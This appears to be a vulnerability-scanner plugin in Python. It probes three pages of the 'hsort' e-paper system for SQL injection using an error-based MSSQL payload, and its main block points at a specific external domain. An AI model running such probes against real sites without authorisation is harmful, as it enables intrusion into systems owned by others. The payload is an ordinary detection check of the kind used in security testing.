#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer : http://www.wooyun.org/bugs/wooyun-2010-024119
# hsort电子版刊管理系统 SimpleShow.aspx,blue_show.aspx SQL注入

import time
def assign(service, arg):
    if service == "hsort":
        return True, arg

def audit(arg):
    payloads=[
        "SimpleShow.aspx?paperName=1",
        "blue_show.aspx?paperName=1",
        "getcalendar.aspx?year=2015",

    ]
    for p in payloads:
        url1=arg + p +"%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
        code,_,res,_,_ = curl.curl2(url1)
        if code==500 and '81dc9bdb52d04dc20036dbd8313ed055' in res :
            security_hole(url1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('hsort','http://epaper.sdicdt.com:80/')[1])